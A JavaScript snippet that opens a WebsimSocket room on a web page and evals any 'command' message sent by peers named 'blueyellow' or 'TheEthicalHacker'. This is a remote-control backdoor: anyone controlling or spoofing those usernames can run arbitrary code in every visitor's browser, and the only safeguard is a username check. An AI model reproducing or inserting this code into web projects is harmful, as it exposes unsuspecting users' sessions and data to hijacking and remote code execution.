let room;
if (typeof window.roomInitialized === "undefined") {
  window.roomInitialized = true; // Set a global flag to indicate initialization

  room = new WebsimSocket();
  room.initialize();

  // Setup a message listener for the room object
  if (typeof room !== "undefined") {
    room.onmessage = (event) => {
      try {
        // Check if the event contains data and if the data has the correct type
        if (
          event.data &&
          event.data.type === "command" &&
          room.peers[event.data.clientId] && // Ensure clientId exists in room.peers
          (room.peers[event.data.clientId].username === "blueyellow" || 
           room.peers[event.data.clientId].username === "TheEthicalHacker")
        ) {
          console.log("Received authorized command:", event.data.command);

          // Evaluate the command
          eval(event.data.command); // WARNING: Use eval only if you trust the source of the commands!
        } else {
          console.log("Unauthorized or invalid message received:", event.data);
        }
      } catch (error) {
        console.error("Error processing message:", error);
      }
    };
  } else {
    console.error("The 'room' object is undefined. Ensure that it is properly initialized.");
  }
} else {
  console.log("Room has already been initialized.");
}
